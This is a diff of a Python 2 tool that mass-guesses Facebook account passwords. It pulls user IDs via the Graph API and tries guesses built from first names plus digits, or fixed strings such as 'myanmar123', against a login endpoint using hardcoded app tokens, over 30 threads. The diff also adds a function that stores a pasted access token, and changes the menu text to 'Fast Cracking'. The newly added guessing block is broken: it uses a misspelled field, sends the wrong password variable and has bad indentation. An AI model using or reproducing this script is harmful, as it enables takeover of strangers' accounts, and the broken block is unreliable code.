@@ -196,6 +196,24 @@ def idlogin():
 		        t()
 		        login()
 
+def token():
+    os.system('clear')
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+        menu()
+    except (KeyError, IOError):
+        print logo
+        print ' \t        [\x1b[1;97m\x1b[1;41m  Paste Token  \x1b[0m\x1b[1;93m]'.center(50)
+        print ''
+        print ''
+        token = raw_input(' \x1b[1;92m[+] Token : \x1b[1;93m')
+        sav = open('access_token.txt', 'w')
+        sav.write(token)
+        sav.close()
+        login()
+
+
 def menu():
 	cb()
 	try:
@@ -224,9 +242,9 @@ def menu():
 	print
 	print (S + 50*'-')
 	print
-	print (S + '[' + P + '︻デ═一1' + S + ']' + S + ' Fast Cloning New Update')
+	print (S + '[' + P + '︻デ═一1' + S + ']' + S + ' Fast Cracking...')
 	print (S + '[' + P + '︻デ═一2' + S + ']' + S + ' Update Tool')
-	print (S + '[' + P + '︻デ═一3' + S + ']' + S + ' Contact In Facebook For Any Help')
+	print (S + '[' + P + '︻デ═一3' + S + ']' + S + ' Contact My Facebook Page')
 	print (S + '[' + Y + '︻デ═一4' + S + ']' + G + ' Log Out')
 	print (S + '[' + Y + '︻デ═一0' + S + ']' + R + ' Exit')
 	print
@@ -355,7 +373,7 @@ def pb():
 		try:
 			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
 			j=json.loads(h.text)
-			ps1=('786786')
+			ps1=('myanmar123')
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
@@ -377,7 +395,7 @@ def pb():
 			                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps2)
 			                oks.append(user+ps2)
 			            else:
-			                ps3=(j['first_name']+'786')
+			                ps3=(j['first_name']+'1234')
 			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                k=json.load(dt)
 			                if 'www.facebook.com' in k['error_msg']:
@@ -420,6 +438,19 @@ def pb():
 			                                            if 'access_token' in k:
 			                                                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
 			                                                oks.append(user+ps6)
+                                                                    else:
+			                                                ps7=(j['fast_name']+'424')
+			                                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                                k=json.load(dt)
+			                                                if 'www.facebook.com' in k['error_msg']:
+			                                                    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
+			                                                    cps.append(user+ps6)
+			                                                else:
+			                                                    if 'access_token' in k:
+			                                                    print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6)
+			                                                    oks.append(user+ps7)
+
+
 		except:
 			pass
 	p=ThreadPool(30)
